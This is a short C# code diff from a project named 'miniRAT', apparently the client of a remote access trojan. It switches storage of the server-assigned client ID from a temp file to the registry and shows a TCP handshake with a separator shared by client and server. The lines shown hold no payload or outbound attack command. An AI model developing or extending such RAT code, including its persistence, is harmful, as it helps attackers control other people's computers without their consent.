@@ -17,7 +17,7 @@ namespace miniRAT
         //must be same in client and server
         const string separator = "|||";
 
-        static Guid clientID = TempFile.ReadTmpFileGuid();
+        static Guid clientID = ClientKeyRegistery.ReadGuid();
         static TcpClient tcpClient;
         private static Mutex sendMutex = new Mutex();
 
@@ -114,7 +114,7 @@ namespace miniRAT
                 clientID = Guid.Parse(helloArray[0].ToString());
 
                 // set client key give from server in first time connected and set to appsetting to use it in next connectin to the server
-                TempFile.UpdateTmpFileGuid(clientID.ToString());
+                ClientKeyRegistery.UpdateGuid(clientID.ToString());
                 //Configuration configuration = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);
                 //configuration.AppSettings.Settings["GUIDKEY"].Value = clientID.ToString();
                 //configuration.Save(ConfigurationSaveMode.Modified);
